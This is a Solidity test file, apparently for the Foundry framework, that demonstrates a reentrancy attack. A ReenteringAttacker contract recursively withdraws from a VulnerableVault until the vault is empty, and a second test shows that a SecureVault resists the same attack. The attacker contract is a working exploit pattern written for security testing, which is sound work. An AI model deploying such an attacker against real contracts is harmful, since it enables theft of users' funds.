// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/VulnerableVault.sol";
import "../src/SecureVault.sol";

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReenteringAttacker {
    IVault public immutable vault;

    constructor(IVault vault_) { vault = vault_; }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            // The vulnerable target permits this nested withdrawal. The secure
            // target rejects it; the low-level call is intentionally ignored.
            address(vault).call(abi.encodeWithSelector(IVault.withdraw.selector, 1 ether));
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "send exactly one ether");
        vault.deposit{value: msg.value}();
        vault.withdraw(1 ether);
    }
}

interface Vm {
    function deal(address account, uint256 newBalance) external;
}

contract VaultReentrancyTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function setUp() public {
        vm.deal(address(this), 100 ether);
    }

    function testVulnerableVaultCanBeDrained() public {
        VulnerableVault vault = new VulnerableVault();
        vault.deposit{value: 5 ether}(); // synthetic victim liquidity
        ReenteringAttacker attacker = new ReenteringAttacker(IVault(address(vault)));
        attacker.attack{value: 1 ether}();
        require(address(vault).balance == 0, "expected vulnerable vault to be drained");
        require(address(attacker).balance == 6 ether, "attacker did not receive repeated withdrawals");
    }

    function testSecureVaultResistsReentrancy() public {
        SecureVault vault = new SecureVault();
        vault.deposit{value: 5 ether}();
        ReenteringAttacker attacker = new ReenteringAttacker(IVault(address(vault)));
        attacker.attack{value: 1 ether}();
        require(address(vault).balance == 5 ether, "secure vault should retain victim liquidity");
        require(address(attacker).balance == 1 ether, "attacker should only recover own deposit");
    }

    // Foundry supplies test contracts with a large default balance. This
    // receive function allows the test contract to fund the mock vault.
    receive() external payable {}
}
